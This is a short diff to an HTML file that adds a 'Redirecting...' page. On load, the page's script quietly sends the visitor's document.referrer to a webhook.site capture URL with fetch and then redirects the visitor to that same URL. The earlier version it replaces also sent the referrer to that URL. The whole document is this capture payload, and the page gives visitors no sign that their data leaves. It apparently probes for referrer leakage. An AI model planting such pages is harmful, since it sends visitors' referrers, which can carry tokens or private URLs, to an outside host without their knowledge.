@@ -1,3 +1,16 @@
-<script>
-  fetch('https://webhook.site/d9339d40-0ae9-49cd-a44e-745f29893082' + document.referrer);
-</script>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Redirecting...</title>
+    <script>
+      // Log the referrer to webhook.site with fetch
+      fetch("https://webhook.site/d9339d40-0ae9-49cd-a44e-745f29893082?ref=" + encodeURIComponent(document.referrer));
+
+      // Then redirect user
+      window.location.href = "https://webhook.site/d9339d40-0ae9-49cd-a44e-745f29893082";
+    </script>
+  </head>
+  <body>
+    Redirecting...
+  </body>
+</html>
